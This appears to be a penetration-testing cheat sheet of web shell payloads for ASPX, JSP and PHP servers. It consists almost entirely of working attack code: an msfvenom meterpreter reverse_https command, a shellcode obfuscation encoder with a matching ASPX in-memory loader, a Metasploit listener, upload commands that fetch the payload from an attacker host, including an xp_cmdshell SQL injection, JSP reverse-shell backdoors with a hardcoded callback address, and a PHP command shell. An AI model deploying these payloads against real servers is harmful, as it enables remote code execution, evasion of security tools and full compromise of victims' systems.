### **ASPX**

**Steps**

1. **Craft your payload**

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=443 -f aspx -o pay.aspx

```

1. **Encode the shellcode part of your payload using Caesar encryptor** from a `C#` Console App below; or use the *XOR GUI Encryptor Tool* from Utilities

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CaesarEncrypt
{
    class Program
    {
        static void Main(string[] args)
        {
            // INSERT SHELLCODE HERE
            byte[] buf = new byte[685]
            {
                shellcodeHere
            };
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint) buf[i] + 5) & 0xFF);
            }
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach(byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }
            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}

```

1. **Insert your shellcode below**, and save it as `[PAYLOAD_NAME].ASPX`

```csharp
< % @ Page Language = "C#"
AutoEventWireup = "true" % > < % @ Import Namespace = "System.IO" % > < script runat = "server" > private static Int32 MEM_COMMIT = 0x1000;
private static IntPtr PAGE_EXECUTE_READWRITE = (IntPtr) 0x40;
[System.Runtime.InteropServices.DllImport("kernel32")]
private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, Int32 flAllocationType, IntPtr flProtect);
[System.Runtime.InteropServices.DllImport("kernel32")]
private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr param, Int32 dwCreationFlags, ref IntPtr lpThreadId);
[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
[System.Runtime.InteropServices.DllImport("kernel32.dll")]
private static extern IntPtr GetCurrentProcess();
protected void Page_Load(object sender, EventArgs e)
{
    IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
    if (mem == null)
    {
        return;
    }
    byte[] oe7hnH0 = new byte[685]
    {
        shellcodeHere
    };
    for (int i = 0; i < oe7hnH0.Length; i++)
    {
        oe7hnH0[i] = (byte)(((uint) oe7hnH0[i] - 5) & 0xFF);
    }
    IntPtr uKVv = VirtualAlloc(IntPtr.Zero, (UIntPtr) oe7hnH0.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    System.Runtime.InteropServices.Marshal.Copy(oe7hnH0, 0, uKVv, oe7hnH0.Length);
    IntPtr xE34tIARlB = IntPtr.Zero;
    IntPtr iwuox = CreateThread(IntPtr.Zero, UIntPtr.Zero, uKVv, IntPtr.Zero, 0, ref xE34tIARlB);
} < /script>

```

1. **Setup your listener**

```bash
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [Attacker_IP]; set lport 443; exploit"

```

1. **Upload it to the server and then find a way to trigger it in the web server**

```powershell
# Usually an upload functionality that after uploading allow us to see the files

# PowerShell Download
iwr -uri http://[ATTACKER_IP]/[NAME].aspx -o C:\inetpub\wwwroot\[PAYLOAD_NAME].aspx

# SQL Injection RCE
'; EXEC master.dbo.xp_cmdshell "powershell.exe iwr -uri http://[ATTACKER_IP]/[NAME].aspx -o C:\inetpub\wwwroot\[PAYLOAD_NAME].aspx";--

```

### **JSP**

**Reverse Shell Payload**

```jsx
<%@
page import="java.lang.*, java.util.*, java.io.*, java.net.*"
% >
<%!
static class StreamConnector extends Thread
{
        InputStream is;
        OutputStream os;

        StreamConnector(InputStream is, OutputStream os)
        {
                this.is = is;
                this.os = os;
        }

        public void run()
        {
                BufferedReader isr = null;
                BufferedWriter osw = null;

                try
                {
                        isr = new BufferedReader(new InputStreamReader(is));
                        osw = new BufferedWriter(new OutputStreamWriter(os));

                        char buffer[] = new char[8192];
                        int lenRead;

                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)
                        {
                                osw.write(buffer, 0, lenRead);
                                osw.flush();
                        }
                }
                catch (Exception ioe)

                try
                {
                        if(isr != null) isr.close();
                        if(osw != null) osw.close();
                }
                catch (Exception ioe)
        }
}
%>

<h1>JSP Backdoor Reverse Shell</h1>

<form method="post">
IP Address
<input type="text" name="ipaddress" size=30>
Port
<input type="text" name="port" size=10>
<input type="submit" name="Connect" value="Connect">
</form>
<p>
<hr>

<%
String ipAddress = request.getParameter("ipaddress");
String ipPort = request.getParameter("port");

if(ipAddress != null && ipPort != null)
{
        Socket sock = null;
        try
        {
                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());

                Runtime rt = Runtime.getRuntime();
                Process proc = rt.exec("cmd.exe");

                StreamConnector outputConnector =
                        new StreamConnector(proc.getInputStream(),
                                          sock.getOutputStream());

                StreamConnector inputConnector =
                        new StreamConnector(sock.getInputStream(),
                                          proc.getOutputStream());

                outputConnector.start();
                inputConnector.start();
        }
        catch(Exception e)
}
%>

```

**RCE Payload**

```jsx
<%
    /*
     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.
     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing
     * the command specified in the HTML form). This is to avoid to keep it simple.
     */
%>

<%@page import="java.lang.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%@page import="java.util.*"%>

<html>
<head>
    <title>jrshell</title>
</head>
<body>
<form METHOD="POST" NAME="myform" ACTION="">
    <input TYPE="text" NAME="shell">
    <input TYPE="submit" VALUE="Send">
</form>
<pre>
<%

    // Define the OS
    String shellPath = null;
    try
    {
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
            shellPath = new String("/bin/sh");
        } else {
            shellPath = new String("cmd.exe");
        }
    } catch( Exception e ){}

    // INNER HTML PART
    if (request.getParameter("shell") != null) {
        out.println("Command: " + request.getParameter("shell") + "\n<BR>");
        Process p;

        if (shellPath.equals("cmd.exe"))
            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));
        else
            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));

        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }

    // TCP PORT PART
    class StreamConnector extends Thread
    {
        InputStream wz;
        OutputStream yr;

        StreamConnector( InputStream wz, OutputStream yr ) {
            this.wz = wz;
            this.yr = yr;
        }

        public void run()
        {
            BufferedReader r  = null;
            BufferedWriter w = null;
            try
            {
                r  = new BufferedReader(new InputStreamReader(wz));
                w = new BufferedWriter(new OutputStreamWriter(yr));
                char buffer[] = new char[8192];
                int length;
                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
                {
                    w.write( buffer, 0, length );
                    w.flush();
                }
            } catch( Exception e ){}
            try
            {
                if( r != null )
                    r.close();
                if( w != null )
                    w.close();
            } catch( Exception e ){}
        }
    }

    try {
        Socket socket = new Socket( "192.168.119.128", 8081 ); // Replace with wanted ip and port
        Process process = Runtime.getRuntime().exec( shellPath );
        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
        out.println("port opened on " + socket);
     } catch( Exception e ) {}

%>
</pre>
</body>
</html>

```

### **PHP**

```php
<?php
SYSTEM($_REQUEST['cmd']);
    // echo shell_exec($_GET['cmd']);
    // echo passthru($_GET['cmd']);
?>

```
